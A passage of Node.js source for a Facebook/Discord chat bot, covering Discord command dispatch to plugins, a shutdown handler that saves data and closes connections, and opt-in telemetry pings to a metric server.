              if (!returndata) return;
              if (returndata.handler == "internal" && typeof returndata.data == "string") {
                message.reply((returndata.data || ""), {
                  split: true
                });
              } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                var body = returndata.data.body || "";
                delete returndata.data.body;
                returndata.data.split = true;
                message.reply(body, returndata.data);
              }
            }
          }) === true) {
            nointernalresolve = true;
          }
        }
      }
    }
    if (message.content.startsWith(global.config.commandPrefix) && !nointernalresolve) {
      if (((global.config.discordlistenwhitelist && global.config.discordlisten.indexOf(message.channel.id) != -1) ||
        (!global.config.discordlistenwhitelist && global.config.discordlisten.indexOf(message.channel.id) == -1)) &&
        !message.author.bot && !Object.prototype.hasOwnProperty.call(
          global.config.blacklistedUsers,
          ("DC-" + message.author.id)
        )) {
        log(
          "[Discord]", message.author.id, "(" + message.author.tag + ")", "issued command in", message.channel.id +
          " (" + message.channel.name + "):",
          message.content,
          (message.attachments.size > 0 ? message.attachments : "")
        );
        var currenttime = new Date();
        var arg = message.content.replace((/”/g), "\"")
          .replace((/“/g), "\"")
          .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
          .filter(function (el) {
            return !(el == null || el == "" || el == " ");
          })
          .map(xy => xy.replace(/"/g, ""));
        if (global.commandMapping[arg[0].substr(1)]) {
          if (!(global.commandMapping[arg[0].substr(1)].compatibly & 2) && global.commandMapping[arg[0].substr(1)]
            .compatibly != 0) {
            message.reply(global.lang["UNSUPPORTED_INTERFACE"]);
          } else {
            var admin = false;
            for (var no in global.config.admins) {
              if (global.config.admins[no] == "DC-" + message.author.id) {
                admin = true;
              }
            }
            global.data.cacheName["DC-" + message.author.id] = message.author.tag;
            var mentions = {};
            message.mentions.users.forEach(function (y, x) {
              mentions["DC-" + x] = y;
              global.data.cacheName["DC-" + x] = y.username + "#" + y.discrimator;
            });
            try {
              if (facebook) {
                if (!facebook.api) {
                  facebook.api = {};
                }
              } else {
                facebook = {};
                facebook.api = {};
              }
              var returndata = global.commandMapping[arg[0].substr(1)].scope("Discord", {
                args: JSON.parse(JSON.stringify(arg)),
                time: currenttime,
                msgdata: message,
                prefix: prefix,
                admin: admin,
                mentions: mentions,
                discordapi: client,
                facebookapi: facebook.api,
                log: function logPlugin(...message) {
                  log.apply(global, [
                    "[PLUGIN]",
                    "[" + global.commandMapping[arg[0].substr(1)].handler + "]"
                  ].concat(message));
                },
                return: function returndata(returndata) {
                  if (!returndata) return;
                  if (returndata.handler == "internal" && typeof returndata.data == "string") {
                    message.reply((returndata.data || ""), {
                      split: true
                    });
                  } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                    var body = returndata.data.body || "";
                    delete returndata.data.body;
                    returndata.data.split = true;
                    message.reply(body, returndata.data);
                  }
                }
              });
            } catch (ex) {
              log("[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:", ex);
              var returndata = {
                handler: "internal",
                data: "plerr: " + ex.stack
              };
            }
            if (typeof returndata == "object") {
              if (returndata.handler == "internal" && typeof returndata.data == "string") {
                message.reply((returndata.data || ""), {
                  split: true
                });
              } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                var body = returndata.data.body || "";
                delete returndata.data.body;
                returndata.data.split = true;
                message.reply(body, returndata.data);
              }
            } else if (typeof returndata != "undefined") {
              log("[Facebook]", "Received an unknown response from plugin:", returndata);
            }
          }
        } else {
          if (!global.config.hideUnknownCommandMessage) {
            message.reply(global.lang["UNKNOWN_CMD"].replace("{0}", global.config.commandPrefix));
          }
        }
      } else {
        log(
          "[Discord]", message.author.id, "(" + message.author.tag + ")", (message.channel instanceof Discord
            .DMChannel ? "DMed:" : "messaged in channel " + message.channel.id + " (" + message.channel.name + "):"
        ), message.content, (message.attachments.size > 0 ? message.attachments : "")
        );
      }
    } else {
      log(
        "[Discord]", message.author.id, "(" + message.author.tag + ")", (message.channel instanceof Discord
          .DMChannel ? "DMed:" : "messaged in channel " + message.channel.id + " (" + message.channel.name + "):"),
        message.content, (message.attachments.size > 0 ? message.attachments : "")
      );
    }
  };
  client.on('message', discordMessageHandler);
  log("[Discord]", "Logging in...");
  client.login(global.config.discordtoken);
  global.config.discordtoken = "<REDACTED>";
}
//Handling exit
var shutdownHandler = function (errorlevel) {
  log("[INTERNAL]", "Detected process is shutting down, handling...");
  //Stop Facebook listener
  if (facebook.listener) {
    facebook.listener.stopListening();
    try {
      clearInterval(facebook.removePendingClock);
      clearInterval(facebook.deliveryClock);
    } catch (ex) { }
    log("[Facebook]", "Stopped Facebook listener");
  }
  //Stop Discord listener and destroy Discord client
  if (global.config.enablediscord) {
    client.removeListener('message', discordMessageHandler);
    log("[Discord]", "Stopped Discord listener");
    client.destroy();
    log("[Discord]", "Logged out and destroyed client.");
  }
  //Stop auto-saving
  try {
    clearInterval(autosave);
    log("[INTERNAL]", "Stopped auto-save.");
  } catch (ex) {
    log("[INTERNAL]", ex);
  }
  //Unload all plugins 
  unloadPlugin();

  //Save for the last time
  if (testmode) {
    fs.writeFileSync(path.join(__dirname, "data-test.json"), JSON.stringify(global.data, null, 4), {
      mode: 0o666
    });
  } else {
    fs.writeFileSync(path.join(__dirname, "data.json"), JSON.stringify(global.data, null, 4), {
      mode: 0o666
    });
  }
  log("[INTERNAL]", "Saved data.");
  //Logout if don't use appstates
  if (!global.config.usefbappstate && typeof facebook.api == "object" && typeof facebook.api.logout == "function" &&
    facebookloggedIn) {
    var err = wait.for.callback(facebook.api.logout);
    log("[Facebook]", "Logged out.", err);
  }
  //Delete appstate if not logged in
  if (!facebookloggedIn) {
    fs.unlinkSync(path.join(__dirname, "fbstate.json"));
  }
  //Close SSH connections
  for (var conn in global.sshstream) {
    try {
      global.sshstream[conn].close();
    } catch (ex) {
      log("[SSH]", conn, "is already closed. Skipping...");
    }
  }

  //Stop local SOCK2HTTP
  if (typeof localSocksProxy != "undefined") {
    localSocksProxy.close();
    log("[INTERNAL]", "Closed local SOCKS2HTTP proxy.");
  }
  log("[INTERNAL]", "Closing bot with code " + errorlevel + "..." + "\x1b[m\r\n");
  rl.setPrompt("\x1b[m");
  console.log();
};
//Handle SIGINT and SIGTERM
var signalHandler = function (signal) {
  log("[INTERNAL]", signal, "detected, triggering exit function...");
  process.exit();
};
process.on('SIGTERM', () => signalHandler("SIGTERM")); //Ctrl+C but not on Windows?
process.on('SIGINT', function () {
  signalHandler("SIGINT");
}); //Ctrl+C?
process.on('SIGHUP', function () {
  signalHandler("SIGHUP");
}); //Windows Command Prompt close button?
rl.on('SIGTERM', () => process.emit('SIGINT'));
rl.on('SIGINT', () => process.emit('SIGINT'));
process.on('exit', shutdownHandler);

if (global.config.enableMetric) {
  var { osName } = require("./getOSInfo.js");
  var metric = require("./metric.js");

  var fPing = function ping(func) {
    var send = {
      version,
      facebookid,
      discordid,
      ram: os.totalmem(),
      ostype: os.type(),
      osplatform: os.platform()
        .toString(),
      osrelease: os.release(),
      cpuarch: os.arch(),
      cpuload: (currentCPUPercentage * 100)
        .toFixed(0),
      botname: global.config.botname,
      prefix: global.config.commandPrefix,
      osname: osName,
      desc: "No description.",
      admin: JSON.stringify(global.config.admins)
    };
    if (global.config.metricHideBotAccountLink) {
      send.hide = true;
    }
    if (process.env.PORT && global.config.herokuApplication != "") {
      send.heroku = true;
      send.herokuapp = global.config.herokuApplication;
    }
    return func(send);
  }

  var metricNewLogic = function metricNewLogic() {
    log("[Metric]", "Generating new Metric ID...");
    metric.createNew(version, global.config.metricHideBotAccountLink)
      .then(metricData => {
        log("[Metric]", `Generated new metric ID (${metricData.metricID})`);
        global.data.metricID = metricData.metricID;
        global.data.metricSecret = metricData.metricSecret;
        metric.authenticate(metricData.metricID, metricData.metricSecret)
          .then(ping => {
            fPing(ping)
              .then(function () {
                log("[Metric]", `Successfully ping Metric server with new Metric ID (${metricData.metricID}).`);
                setInterval(function (ping) {
                  fPing(ping)
                    .then(() => log(
                      "[Metric]",
                      `Successfully ping Metric server with Metric ID ${metricData.metricID}.`
                    ))
                    .catch(ret => {
                      var [err] = ret;
                      log("[Metric]", `Error while pinging with Metric ID ${metricData.metricID}`, err);
                    });
                }, 50000, ping);
              })
              .catch(ret => {
                var [err] = ret;
                log("[Metric]", "Error while pinging with new Metric ID & Secret:", err);
              });
          })
          .catch(ret => {
            var [err] = ret;
            log("[Metric]", "Error while authenticating with new Metric ID & Secret:", err);
          });
      })
      .catch(ret => {
        var [err] = ret;
        log("[Metric]", "Error while generating new Metric ID & Secret:", err);
      });
  };
  if (typeof global.data.metricID != "string" || typeof global.data.metricSecret != "string") {
    metricNewLogic();
  } else {
    var metricAuth = function () {
      metric.authenticate(global.data.metricID, global.data.metricSecret)
        .then(ping => {
          fPing(ping)
            .then(function () {
              log("[Metric]", `Successfully ping Metric server with Metric ID ${global.data.metricID}.`);
              setInterval(function (ping) {
                fPing(ping)
                  .then(() => log(
                    "[Metric]",
                    `Successfully ping Metric server with Metric ID ${global.data.metricID}.`
                  ))
                  .catch(ret => {
                    var [err] = ret;
                    log("[Metric]", `Error while pinging with Metric ID ${global.data.metricID}`, err);
                  });
              }, 50000, ping);
            })
            .catch(ret => {
              var [err] = ret;
              log("[Metric]", `Error while pinging with Metric ID ${global.data.metricID}:`, err);
            });
        })
        .catch(ret => {
          var [err, notneterr] = ret;
          log("[Metric]", `Error while authenticating with Metric ID ${global.data.metricID}:`, err);
          if (notneterr) {
            metricNewLogic();
          } else {
            log("[Metric]", `Reauthenticating with Metric ID ${global.data.metricID} because of network/server error.`);
            setTimeout(metricAuth, 0);
          }
        });
    };
    metricAuth();
  }
}
